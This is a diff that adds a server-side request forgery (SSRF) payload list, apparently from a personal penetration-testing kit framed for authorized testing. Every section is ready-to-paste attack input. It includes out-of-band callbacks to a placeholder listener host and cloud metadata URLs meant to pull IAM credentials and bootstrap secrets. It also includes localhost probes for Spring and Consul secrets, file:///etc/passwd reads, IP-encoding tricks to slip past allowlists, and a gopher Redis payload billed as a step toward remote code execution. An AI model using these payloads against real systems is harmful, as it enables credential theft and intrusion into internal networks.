@@ -1,0 +1,72 @@
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# SSRF OOB/Target probe URL battery - x8bitranjit lab style (benign by default)
+# Authorized security testing only.
+#
+# HOW TO USE:
+#   1) Replace  YOUR-OOB-HOST.example.invalid  with your listener hostname
+#      (Burp Collaborator: <id>.oast.pro  |  interactsh: <id>.oast.fun).
+#      ".invalid" never resolves -> this file is INERT until you edit it.
+#   2) Paste each line into the vulnerable URL parameter / webhook field /
+#      import-from-URL box, one per test. One UNIQUE subdomain per parameter
+#      (param1.YOUR-OOB-HOST...) so every callback maps to its exact input.
+#   3) Confirm callbacks come FROM THE TARGET's server IP (not yours/CDN).
+#
+# WHERE TO USE: any URL-accepting parameter (fetch/import/avatar-from-url/
+# webhook/preview/export-source), document/image processors (see
+# svg_ssrf_beacon.svg + ffmpeg_lfi_ssrf_poc.m3u8), XXE (xxe_oob_beacon.xml).
+# ============================================================================
+
+# --- Your OOB listener (the first thing to fire anywhere) -------------------
+http://ssrf1.YOUR-OOB-HOST.example.invalid/
+https://ssrf2.YOUR-OOB-HOST.example.invalid/
+
+# --- Cloud metadata (implant creds if SSRF confirmed; read-only discipline) --
+http://169.254.169.254/latest/meta-data/
+        # AWS IMDSv1   <- (comment for the URL ABOVE)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+        # AWS role list   <- (comment for the URL ABOVE)
+http://169.254.169.254/latest/user-data
+        # AWS bootstrap secrets   <- (comment for the URL ABOVE)
+http://metadata.google.internal/computeMetadata/v1/
+        # GCP (needs Metadata-Flavor: Google header)   <- (comment for the URL ABOVE)
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+        # Azure IMDS (needs header: Metadata:true)   <- (comment for the URL ABOVE)
+http://100.100.100.200/latest/meta-data/
+        # Alibaba   <- (comment for the URL ABOVE)
+http://192.0.0.192/opc/v1/all/
+        # Oracle   <- (comment for the URL ABOVE)
+
+# --- Localhost / internal reachability ---------------------------------------
+http://127.0.0.1/
+http://127.0.0.1:8080/
+http://127.0.0.1:8080/actuator/env
+        # Spring Boot secrets (Java stacks)   <- (comment for the URL ABOVE)
+http://127.0.0.1:9090/
+        # Prometheus/admin panels   <- (comment for the URL ABOVE)
+http://localhost:8500/v1/kv/?recurse
+        # Consul KV (secrets)   <- (comment for the URL ABOVE)
+file:///etc/passwd                          # scheme-dependent (PHP/Java/curl wrappers)
+file:///etc/hostname
+
+# --- Obfuscation battery (for allowlist'd targets - SSRF kit rows) -----------
+http://127.0.0.1@YOUR-OOB-HOST.example.invalid/
+        # userinfo confusion   <- (comment for the URL ABOVE)
+http://2130706433/
+        # decimal 127.0.0.1   <- (comment for the URL ABOVE)
+http://0x7f000001/
+        # hex   <- (comment for the URL ABOVE)
+http://017700000001/
+        # octal   <- (comment for the URL ABOVE)
+http://[::1]/
+        # IPv6 loopback   <- (comment for the URL ABOVE)
+http://127.1/
+        # short form   <- (comment for the URL ABOVE)
+http://target.com@127.0.0.1/
+        # allowed-host confusion   <- (comment for the URL ABOVE)
+
+# --- Scheme battery (wrapper-dependent) --------------------------------------
+gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0AINFO%0D%0A    # Redis fingerprint via gopher (SSRF->RCE chain: NOSQL-019)
+dict://127.0.0.1:6379/INFO                                  # dict:// service probe
+ftp://YOUR-OOB-HOST.example.invalid/                        # ftp fetch/callback
+ldap://YOUR-OOB-HOST.example.invalid/                       # ldap scheme probe
